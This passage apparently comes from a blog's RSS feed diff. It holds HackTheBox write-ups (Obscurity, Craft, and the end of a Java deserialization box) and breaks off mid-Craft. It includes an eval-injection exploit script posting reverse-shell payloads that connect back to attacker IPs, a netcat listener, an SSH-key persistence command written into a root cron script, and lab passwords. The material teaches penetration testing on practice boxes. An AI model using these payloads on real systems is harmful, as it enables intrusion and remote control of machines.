+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;zip -r website.bak.zip /var/www/html &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mv website.bak.zip /root/backup.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, we could just import our public SSH key and have root access.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo SSH_PUB_KEY &amp;gt;&amp;gt; /root/.ssh/authorized_keys&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /usr/bin/timer_backup.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;I&amp;rsquo;ve seen that a lot of people said that this box is easy, which I can agree in the way that you can find the CVE quite easy and modify the POC payload to get the flags and move on, without diving more into it. However, I think that this is a great box for someone new and even for some more experienced people. I say this because if you really want to understand what&amp;rsquo;s going on behind the scenes, which you should, you understand new concepts such as: &lt;em&gt;java deserialization, gadgets, how an actual CVE is found, etc&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Honestly, I learned a lot by playing around with this box and afterall this is the goal of &lt;em&gt;HTB&lt;/em&gt;. To learn new concepts that you can add to your skill-set which elevates your craft.&lt;/p&gt;
+&lt;p&gt;If you want to dig deeper into deserealization attacks within java libraries, I suggest you check the references down below. I found some really great articles/talks about this subject which I can&amp;rsquo;t give enough credit.&lt;/p&gt;
+&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d&#34;&gt;Understanding Java Deserialization&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ikkisoft/SerialKiller&#34;&gt;Java deserealization lib to secure apps&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038&#34;&gt;Understanding insecure implementation of Jackson deserialization&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96&#34;&gt;On Jackson CVEs: Don’t Panic — Here is what you need to know&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858&#34;&gt;SnakeYaml Deserilization exploited&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;POC tool 4 generating payloads that exploit unsage Java object deserilization&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://brandur.org/fragments/gadgets-and-chains&#34;&gt;Depickling, gadgets and chains: The class of exploit that unraveled Equifax&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/galimba/Jackson-deserialization-PoC&#34;&gt;POC Jackson deserilization on Spring web app&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json&#34;&gt;Java deserilization cheat-sheet&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/FasterXML/jackson&#34;&gt;Jackson Library&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=KSA7vUkXGSg&#34;&gt;Marshalling Pickles - OWASP AppSec California 2015&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;CVE-2019-12384&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Obscurity Hackthebox</title>
+      <link>https://vlaghe.github.io/writeups/htb/obscurity/</link>
+      <pubDate>Wed, 10 Mar 2021 12:48:05 +0300</pubDate>
+      
+      <guid>https://vlaghe.github.io/writeups/htb/obscurity/</guid>
+      <description>Enumeration I started with a simple nmap to get a basic overview:
+nmap -sC -sV -oA nmap/obscurity 10.10.10.168 As you can see ports 8080 (http), 22(ssh) and 9000 are open.
+Website Once on the web page we are prompted with this:
+If you scroll a little bit more we find something peculiar:
+So we need to find the SuperSecureServer.py file in order to get the backend code of this web app.</description>
+      <content>&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/OcukgEq.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;I started with a simple nmap to get a basic overview:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sC -sV -oA nmap/obscurity 10.10.10.168
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UtwqgOP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As you can see ports &lt;code&gt;8080&lt;/code&gt; (&lt;strong&gt;http&lt;/strong&gt;), &lt;code&gt;22&lt;/code&gt;(&lt;strong&gt;ssh&lt;/strong&gt;) and &lt;code&gt;9000&lt;/code&gt; are open.&lt;/p&gt;
+&lt;h1 id=&#34;website&#34;&gt;Website&lt;/h1&gt;
+&lt;p&gt;Once on the web page we are prompted with this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DyVcVsf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you scroll a little bit more we find something peculiar:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/nx5y6OA.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So we need to find the &lt;code&gt;SuperSecureServer.py&lt;/code&gt; file in order to get the backend code of this web app. For that I used &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;ffuf&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SZfkC5u.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After letting &lt;code&gt;ffuf&lt;/code&gt; to do it&amp;rsquo;s job for a while, we are prompted with the desired folder: &lt;code&gt;develop&lt;/code&gt;. So, the directory was not so secret afterall because we can access the file at &lt;code&gt;/develop/SuperSecureServer.py&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/2PDFkRP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Well, now it&amp;rsquo;s time to look for a &lt;strong&gt;RCE&lt;/strong&gt; or something that we can exploit. This task is not so complicated since the following line looks like this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vhBYHsX.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So we can execute code if we format correctly the &lt;code&gt;path&lt;/code&gt; variable. Therefore, I came up with this little python script:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mxg9BRw.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When the server processes this, the &lt;code&gt;info&lt;/code&gt; variable will look like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;output = &amp;lsquo;Document&amp;rsquo;
+&amp;lt;reverse_shell&amp;gt;
+ape=&#39;&#39;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is valid python code. As a result, we get back a shell:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/QootNLC.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;user&#34;&gt;User&lt;/h1&gt;
+&lt;p&gt;If we take a look at the folder where the user flag is we find these interesting files:
+&lt;img src=&#34;https://i.imgur.com/ECmODcN.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We have just 4 files we care about:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;SuperSecureCrypt.py&lt;/code&gt; - Python script to encrypt files&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;check.txt&lt;/code&gt; - Clear text of &lt;code&gt;out.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;out.txt&lt;/code&gt; - Ciphertext of clear text &lt;code&gt;check.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;passwordreminder.txt&lt;/code&gt; - Encrypted password of the robert user&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;By taking a look at how the encryption/decryption algorithm works, we find a funny thing. That is, we can obtain the password used in an encrypted text if we know the clear text:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/M03zheF.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Thus, in order to find the password used to encrypt the &lt;code&gt;out.txt&lt;/code&gt; file we just need to execute the following:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rajzLAI.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The password used to encrypt the text was: &lt;strong&gt;alexandrovich&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Now that we know the password, we can decrypt the &lt;code&gt;passwordreminder.txt&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 SuperSecretCrypt.py -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alexandrovich&amp;#34;&lt;/span&gt; -i passwordreminder.txt -o /tmp/pass -d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The password for robert being &lt;strong&gt;SecThruObsFTW&lt;/strong&gt;. Login with &lt;em&gt;SSH&lt;/em&gt; and cat &lt;code&gt;user.txt&lt;/code&gt;
+&lt;img src=&#34;https://i.imgur.com/hvTjk0v.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;root&#34;&gt;Root&lt;/h1&gt;
+&lt;p&gt;Now that we have access to the robert user, we can look at a file we ommited on our journey of getting the user flag. That file is &lt;code&gt;BetterSSH.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wsIffJq.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The first part of the script is just authenticating the user we provide with the password. What is more interesting is the second part:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DmMQfyp.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The 4th line is of interest because it executes commands with &lt;code&gt;sudo -u&lt;/code&gt; and our input, so we can do something like: &lt;code&gt;sudo -u robert -u root whoami&lt;/code&gt;, which in theory should display &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;First I tried to execute the script with sudo:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Grny92t.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Ok.. so we are not allowed to run the script. At this point I decided to run &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&#34;&gt;linpeas&lt;/a&gt;, which gave me this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rHySzW3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now it all makes sense we need to execute:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And then input &lt;code&gt;-u root cat /root/root.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/kizLVnn.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Craft Hackthebox</title>
+      <link>https://vlaghe.github.io/writeups/htb/craft/</link>
+      <pubDate>Mon, 03 Feb 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://vlaghe.github.io/writeups/htb/craft/</guid>
+      <description>Changing hosts file By looking at the source code we can see gogs and api subdomains
+So I just modified the /etc/hosts to the following in order to access them.
+10.10.10.110 craft.htb gogs.craft.htb api.craft.htb Gogs page By a simple Google search we find out that Gogs is a somewhat widely used git service.
+Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented: By simply looking at the code we can easily identify where the vulnerability is.</description>
+      <content>&lt;h2 id=&#34;changing-hosts-file&#34;&gt;Changing hosts file&lt;/h2&gt;
+&lt;p&gt;By looking at the source code we can see gogs and api subdomains&lt;/p&gt;
+&lt;p&gt;So I just modified the  /etc/hosts to the following in order to access them.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;gogs-page&#34;&gt;Gogs page&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wDN37yi.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;By a simple Google search we find out that &lt;a href=&#34;https://gogs.io/&#34;&gt;Gogs&lt;/a&gt; is a somewhat widely used git service.&lt;/p&gt;
+&lt;p&gt;Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented:
+&lt;img src=&#34;https://i.imgur.com/eAIzGds.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;By simply looking at the code we can easily identify where the vulnerability is. That is, passing user defined input directly into the eval function.&lt;/p&gt;
+&lt;p&gt;We can also see that an API is used in the test file, so let&amp;rsquo;s take a look at it as well.&lt;/p&gt;
+&lt;h2 id=&#34;api-page&#34;&gt;API page&lt;/h2&gt;
+&lt;p&gt;We are presented with this once the page loads:
+&lt;img src=&#34;https://i.imgur.com/4cdaJZf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So as you can see we can login ( therefore getting a token ), check the validity of the token and delete,update,create,get brews. However we can&amp;rsquo;t interact with it since we don&amp;rsquo;t have any credentials in order to get a token&amp;hellip;&lt;/p&gt;
+&lt;p&gt;But wait, let&amp;rsquo;s take a closer look at those 2 commits from before.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/LjZ4X8U.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;OH, there you go, credentials found in the source code. Very bad practice indeed :))&lt;/p&gt;
+&lt;h1 id=&#34;exploiting-eval&#34;&gt;Exploiting eval&lt;/h1&gt;
+&lt;p&gt;Now that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel&amp;hellip; that&amp;rsquo;s easy we just need to do this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; json
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;urllib3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;disable_warnings()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://api.craft.htb/api/&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Session()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth/login&amp;#34;&lt;/span&gt;, auth&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;), verify&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loads(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(token)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abv&amp;#34;&lt;/span&gt;       : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.136/7070 0&amp;gt;&amp;amp;1&amp;#39;)#&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;      : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;brewer&amp;#34;&lt;/span&gt;    : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;style&amp;#34;&lt;/span&gt;     : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-Craft-API-Token&amp;#39;&lt;/span&gt;: token,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;brew/&amp;#34;&lt;/span&gt;, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And start our listener:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -nvlp &lt;span style=&#34;color:#ae81ff&#34;&gt;7070&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Execute it and&amp;hellip; Nothing. But it sohuld work right?&lt;/p&gt;
+&lt;p&gt;Well that&amp;rsquo;s what I thought in the first place as well, but after a lot of thinking, poking and coffe I found out that I was pretty restricted, so I said fuck it. And build the payload from scratch with the things I knew would work.&lt;/p&gt;
+&lt;p&gt;Finally I&amp;rsquo;ve ended up with this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eval(compile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;for x in range(1):&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; import socket,subprocess, os&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; s.connect((&amp;#34;10.10.15.200&amp;#34;, 7070))&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; os.dup2(s.fileno(),0)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; os.dup2(s.fileno(),1)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; os.dup2(s.fileno(),2)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; import pty&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;single&amp;#34;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running the same script again, but with this payload I&amp;rsquo;ve got a shell.  Hooray!!&lt;/p&gt;
+&lt;h1 id=&#34;escaping-the-jail&#34;&gt;Escaping the jail&lt;/h1&gt;
+&lt;p&gt;I run &lt;code&gt;whoami&lt;/code&gt; and I&amp;rsquo;m root. Uhmmm&amp;hellip;. That&amp;rsquo;s pretty strange, but ok let&amp;rsquo;s take the root.txt&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat: /root/root.txt: No such file or directory
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At this point I was confused, I thought that I gained access to a box that I wasn&amp;rsquo;t supposed to, but that couldn&amp;rsquo;t happen. Thus, I took a deeper look and found out that I was in a jail. However, I was having access to a file that I was previously interested in, but couldn&amp;rsquo;t find it in the gogs page. That file being &lt;em&gt;&lt;code&gt;settings.py&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;So I just saw it in the directory I was currently in and took a look at it:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Flask settings&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FLASK_SERVER_NAME &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;api.craft.htb&amp;#39;&lt;/span&gt;
